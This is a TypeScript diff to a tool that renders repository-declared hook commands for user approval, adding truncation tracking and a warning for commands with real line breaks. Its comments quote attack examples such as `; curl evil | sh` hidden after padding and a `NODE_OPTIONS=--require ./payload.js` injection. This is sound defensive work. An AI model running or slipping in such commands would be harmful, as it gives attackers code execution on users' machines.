@@ -99,6 +99,19 @@ function visibleEscape(character: string): string {
   return hex.length <= 2 ? `\\x${hex.padStart(2, '0')}` : `\\u${hex.padStart(4, '0')}`;
 }
 
+const UNTRUSTED_TEXT_LIMIT = 200;
+
+/** The walk behind {@link renderUntrustedText}, saying whether it stopped at the limit. */
+function renderWithinLimit(value: string, maxLength: number): { text: string; cut: boolean } {
+  let text = '';
+  for (const character of value) {
+    const shown = character.replace(CONTROL_CHARACTERS, visibleEscape);
+    if (text.length + shown.length > maxLength) return { text: `${text}…`, cut: true };
+    text += shown;
+  }
+  return { text, cut: false };
+}
+
 /**
  * Render repository-authored text for a terminal that is about to ask the user
  * to trust it.
@@ -117,19 +130,13 @@ function visibleEscape(character: string): string {
  * path reads as itself: the output is for reading, not for decoding, and text
  * spelling `\n` reads the same as a newline.
  */
-export function renderUntrustedText(value: string, maxLength = 200): string {
-  let rendered = '';
-  for (const character of value) {
-    const shown = character.replace(CONTROL_CHARACTERS, visibleEscape);
-    if (rendered.length + shown.length > maxLength) return `${rendered}…`;
-    rendered += shown;
-  }
-  return rendered;
+export function renderUntrustedText(value: string, maxLength = UNTRUSTED_TEXT_LIMIT): string {
+  return renderWithinLimit(value, maxLength).text;
 }
 
 /** Whether {@link renderUntrustedText} cuts `value` short at this limit. */
-function isCutShort(value: string, maxLength?: number): boolean {
-  return renderUntrustedText(value, maxLength) !== renderUntrustedText(value, Infinity);
+function isCutShort(value: string, maxLength = UNTRUSTED_TEXT_LIMIT): boolean {
+  return renderWithinLimit(value, maxLength).cut;
 }
 
 /**
@@ -140,7 +147,9 @@ function isCutShort(value: string, maxLength?: number): boolean {
  * `NODE_OPTIONS=--require ./payload.js` reads as harmless and is not. Two
  * entries differing only in matcher or env are also indistinguishable without
  * these lines. Approval also covers what a long value's cut leaves out (`npm test`, 300 spaces,
- * then `; curl evil | sh`), so a cut entry says so and names the file to read.
+ * then `; curl evil | sh`), so a cut entry says so and names the file to read. A real line break
+ * in the command gets a line too: the headline reads the same as text spelling `\n` inside a
+ * comment, yet the shell ends the comment there and runs what follows.
  */
 export function describeDeclaredHook(hook: DeclaredHook): { headline: string; details: string[] } {
   const { command, matcher } = hook.entry;
@@ -149,6 +158,9 @@ export function describeDeclaredHook(hook: DeclaredHook): { headline: string; de
   if (matcher !== undefined) details.push(`matcher:     ${renderUntrustedText(matcher)}`);
   for (const [key, value] of env) {
     details.push(`env:         ${renderUntrustedText(key, 64)}=${renderUntrustedText(value)}`);
+  }
+  if (/[\r\n]/.test(command)) {
+    details.push('multi-line:  the command holds a real line break, shown as \\n or \\r');
   }
   const cutShort =
     isCutShort(command) ||
